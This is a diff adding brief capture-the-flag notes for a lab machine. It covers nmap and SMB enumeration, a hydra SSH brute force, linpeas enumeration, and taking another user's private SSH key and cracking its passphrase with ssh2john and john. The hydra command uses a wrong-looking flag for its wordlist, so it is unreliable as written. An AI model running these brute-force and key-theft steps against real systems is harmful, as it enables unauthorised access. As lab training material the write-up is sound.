@@ -1,0 +1,31 @@
+nmap
+PORT     STATE SERVICE     VERSION
+22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
+80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8080/tcp open  http        Apache Tomcat 9.0.7
+
+gobuster shows /development directory contain the j.txt file that hints to a weak password that belongs to an user "J"
+
+enum4linux shows /Anonymous smb share which contains staff.txt messsage that reveals user name Kay and Jan
+
+brute force ssh with username Jan (because she has a weak password)
+hydra -l jan -w /usr/share/wordlists/rockyou.txt ssh -V -f 
+password for jan is found
+
+ssh in with jan's credentials, she does not have priviledge access
+get linpeas.sh into /dev/shm
+chmod +x linpeas.sh
+linpeas reveals /home/kay/.ssh/id_rsa in plain text
+
+cat the file and copy its content into a file on the local machine
+read the hash from the id_rsa file
+/usr/share/john/ssh2john.py id_rsa > hash
+use john to crack the hash for the password
+sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
+
+change the permission of id_rsa file
+chmod 600 id_rsa
+ssh into kay@IP and get the flag in /home/kay/
